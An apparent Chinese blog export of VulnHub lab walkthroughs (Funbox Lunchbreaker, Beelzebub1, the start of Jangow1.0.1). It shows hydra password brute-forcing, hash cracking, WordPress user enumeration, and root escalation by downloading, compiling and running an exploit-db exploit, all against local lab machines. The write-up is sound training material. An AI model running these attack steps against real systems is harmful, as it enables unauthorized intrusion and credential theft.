<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra 192.168.1.222 ftp -l jane -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  -vV</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">┌──(root💀weiyi)-[&#x2F;home&#x2F;weiyi&#x2F;vulnhub&#x2F;funbox8]</span><br><span class="line">└─# hydra 192.168.1.222 ftp -l jane -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  -vV</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-07-29 09:18:56</span><br><span class="line">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, .&#x2F;hydra.restore</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1&#x2F;p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking ftp:&#x2F;&#x2F;192.168.1.222:21&#x2F;</span><br><span class="line">[VERBOSE] Resolving addresses ... [VERBOSE] resolving done</span><br><span class="line">...</span><br><span class="line">[ATTEMPT] target 192.168.1.222 - login &quot;jane&quot; - pass &quot;jessica&quot; - 16 of 14344399 [child 15] (0&#x2F;0)</span><br><span class="line">[21][ftp] host: 192.168.1.222   login: jane   password: password</span><br><span class="line">[STATUS] attack finished for 192.168.1.222 (waiting for children to complete tests)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-07-29 09:19:13</span><br></pre></td></tr></table></figure>

<ul>
<li><p>获得账号密码 <code>jane / password</code></p>
</li>
<li><p><code>ftp</code>登录发现如下账户信息</p>
</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jane</span><br><span class="line">jim</span><br><span class="line">john</span><br><span class="line">jules</span><br></pre></td></tr></table></figure>

<ul>
<li>继续爆破</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra 192.168.1.222 ftp -l jim -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  -vV</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[21][ftp] host: 192.168.1.222   login: jim   password: 12345</span><br><span class="line"></span><br><span class="line">hydra 192.168.1.222 ftp -l john -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  -vV</span><br><span class="line"></span><br><span class="line">hydra 192.168.1.222 ftp -l jules -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  -vV</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">[21][ftp] host: 192.168.1.222   login: jules   password: sexylady</span><br></pre></td></tr></table></figure>

<ul>
<li>在<code>jules</code>的<code>FTP</code>上发现敏感密码文件</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/5.png" alt></p>
<h3 id="登录jules"><a href="#登录jules" class="headerlink" title="登录jules"></a>登录jules</h3><ul>
<li>获得<code>ssh</code>账号密码<code>jules / sexylady</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jules@192.168.1.222</span><br></pre></td></tr></table></figure>

<ul>
<li><p><a href="https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh</a></p>
</li>
<li><p>获得<code>hash</code>,破解</p>
</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">john:$apr1$2gymw37l$w604wlgyqqNeOgNac.1qT/</span><br><span class="line"></span><br><span class="line">john --wordlist=bad-passwds hash.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">zhnmju!!!        (john)</span><br></pre></td></tr></table></figure>

<h3 id="登录john"><a href="#登录john" class="headerlink" title="登录john"></a>登录john</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh john@192.168.1.222</span><br></pre></td></tr></table></figure>

<ul>
<li>发现敏感信息如下</li>
</ul>
<p><img data-src="./FunboxLunchbreaker/7.png" alt></p>
<h3 id="切换root"><a href="#切换root" class="headerlink" title="切换root"></a>切换root</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su root</span><br><span class="line">zhnmju!!!</span><br></pre></td></tr></table></figure>

<p><img data-src="./FunboxLunchbreaker/8.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Funbox</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
      </tags>
  </entry>
  <entry>
    <title>Beelzebub1</title>
    <url>/2022/01/22/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Beelzebub/</url>
    <content><![CDATA[<h1 id="Beelzebub1"><a href="#Beelzebub1" class="headerlink" title="Beelzebub1"></a>Beelzebub1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Beelzebub1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.102</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111   38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.105   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.191   88:b1:11:0d:56:74       Intel Corporate</span><br><span class="line">192.168.1.242   3c:7c:3f:d3:05:d5       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.163   a4:50:46:78:16:9f       Xiaomi Communications Co Ltd</span><br><span class="line"></span><br><span class="line">12 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.029 seconds (126.17 hosts/sec). 12 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.105</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.182</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.1.105</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 05:48 EDT</span><br><span class="line">Nmap scan report for beelzebub.lan (192.168.1.105)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)</span><br><span class="line">|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)</span><br><span class="line">|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.10 ms beelzebub.lan (192.168.1.105)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.182/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.105/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.105/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/09/11 05:48:55 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 10918]</span><br><span class="line">/index.php            (Status: 200) [Size: 271]  </span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.1.105/javascript/]</span><br><span class="line">/phpmyadmin           (Status: 301) [Size: 319] [--&gt; http://192.168.1.105/phpmyadmin/]</span><br><span class="line">/phpinfo.php          (Status: 200) [Size: 95437]                                     </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/09/11 05:51:23 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Beelzebub/1.png" alt></p>
<ul>
<li><code>index.php</code>界面</li>
</ul>
<p><img data-src="./Beelzebub/2.png" alt></p>
<ul>
<li>继续扫描目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Beelzebub1&gt; gobuster dir -u http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/01/23 05:27:12 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.php            (Status: 200) [Size: 57718]</span><br><span class="line">/wp-content           (Status: 301) [Size: 352] [--&gt; http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/wp-content/]</span><br><span class="line">/wp-login.php         (Status: 200) [Size: 5694]                                                                       </span><br><span class="line">/license.txt          (Status: 200) [Size: 19935]                                                                      </span><br><span class="line">/wp-includes          (Status: 301) [Size: 353] [--&gt; http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/wp-includes/]</span><br><span class="line">/readme.html          (Status: 200) [Size: 7368]                                                                        </span><br><span class="line">/wp-admin             (Status: 301) [Size: 350] [--&gt; http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/wp-admin/]   </span><br><span class="line">/xmlrpc.php           (Status: 405) [Size: 42]                                                                          </span><br><span class="line">/wp-signup.php        (Status: 302) [Size: 0] [--&gt; http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?action=register]</span><br><span class="line">                                                                                                                                    </span><br><span class="line">===============================================================</span><br><span class="line">2022/01/23 05:29:58 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/ --api-token xxxxxxx --ignore-main-redirect --force --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; wpscan --url http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/ --api-token xxxxxxxx --ignore-main-redirect --force --enumerate u                    5 ⨯</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.18</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/ [192.168.1.183]</span><br><span class="line">[+] Started: Sun Jan 23 05:35:36 2022</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line"> |  - X-Redirect-By: WordPress</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).</span><br><span class="line"> | Found By: Atom Generator (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="5.3.6"&gt;WordPress&lt;/generator&gt;</span><br><span class="line"> | Confirmed By: Style Etag (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.1.183/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: '5.3.6'</span><br><span class="line"> |</span><br><span class="line"> | [!] 8 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure</span><br><span class="line"> |     Fixed in: 5.3.7</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450</span><br><span class="line"> |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/</span><br><span class="line"> |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/50717/</span><br><span class="line"> |      - https://www.youtube.com/watch?v=J2GXmxAdNWs</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer</span><br><span class="line"> |     Fixed in: 5.3.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296</span><br><span class="line"> |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62</span><br><span class="line"> |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/</span><br><span class="line"> |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9</span><br><span class="line"> |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/</span><br><span class="line"> |      - https://www.youtube.com/watch?v=HaW15aMzBUM</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.2 - Expired DST Root CA X3 Certificate</span><br><span class="line"> |     Fixed in: 5.3.10</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d</span><br><span class="line"> |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/</span><br><span class="line"> |      - https://core.trac.wordpress.org/ticket/54207</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8 - Plugin Confusion</span><br><span class="line"> |     Fixed in: 5.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223</span><br><span class="line"> |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.3 - SQL Injection via WP_Query</span><br><span class="line"> |     Fixed in: 5.3.11</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84</span><br><span class="line"> |      - https://hackerone.com/reports/1378209</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.3 - Author+ Stored XSS via Post Slugs</span><br><span class="line"> |     Fixed in: 5.3.11</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w</span><br><span class="line"> |      - https://hackerone.com/reports/425342</span><br><span class="line"> |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query</span><br><span class="line"> |     Fixed in: 5.3.11</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress &lt; 5.8.3 - Super Admin Object Injection in Multisites</span><br><span class="line"> |     Fixed in: 5.3.11</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663</span><br><span class="line"> |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h</span><br><span class="line"> |      - https://hackerone.com/reports/541469</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;===========================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] valak</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] krampus</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] WPScan DB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 0</span><br><span class="line"> | Requests Remaining: 24</span><br><span class="line"></span><br><span class="line">[+] Finished: Sun Jan 23 05:35:39 2022</span><br><span class="line">[+] Requests Done: 22</span><br><span class="line">[+] Cached Requests: 44</span><br><span class="line">[+] Data Sent: 7.006 KB</span><br><span class="line">[+] Data Received: 134.866 KB</span><br><span class="line">[+] Memory used: 115.816 MB</span><br><span class="line">[+] Elapsed time: 00:00:02</span><br></pre></td></tr></table></figure>

<ul>
<li>目录发现</li>
</ul>
<p><img data-src="./Beelzebub/3.png" alt></p>
<h3 id="进一步发现"><a href="#进一步发现" class="headerlink" title="进一步发现"></a>进一步发现</h3><p><img data-src="./Beelzebub/4.png" alt></p>
<p>发现密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">M4k3Ad3a1 (上一步发现的账号 valak krampus)</span><br></pre></td></tr></table></figure>

<h3 id="登录ssh-amp-提权"><a href="#登录ssh-amp-提权" class="headerlink" title="登录ssh&amp;提权"></a>登录ssh&amp;提权</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh krampus@192.168.1.183  </span><br><span class="line">M4k3Ad3a1</span><br></pre></td></tr></table></figure>

<ul>
<li>发现如下命令历史</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">krampus@beelzebub:~$ cat .bash_history </span><br><span class="line">...</span><br><span class="line">wget https://www.exploit-db.com/download/47009</span><br><span class="line">clear</span><br><span class="line">ls</span><br><span class="line">clear</span><br><span class="line">mv 47009 ./exploit.c</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit </span><br><span class="line">cd ../../../../../../../</span><br><span class="line">ls</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>提权</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/47009</span><br><span class="line">mv 47009 ./exploit.c</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>

<p><img data-src="./Beelzebub/5.png" alt></p>
<p><img data-src="./Beelzebub/6.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Beelzebub</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Beelzebub</tag>
      </tags>
  </entry>
  <entry>
    <title>Jangow1.0.1</title>
    <url>/2021/11/17/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Jangow1.0.1/</url>
    <content><![CDATA[<h1 id="Jangow1-0-1"><a href="#Jangow1-0-1" class="headerlink" title="Jangow1.0.1"></a>Jangow1.0.1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Jangow1.0.1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Jangow1&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.145   c0:e7:3e:cb:56:6f       (Unknown)</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.108   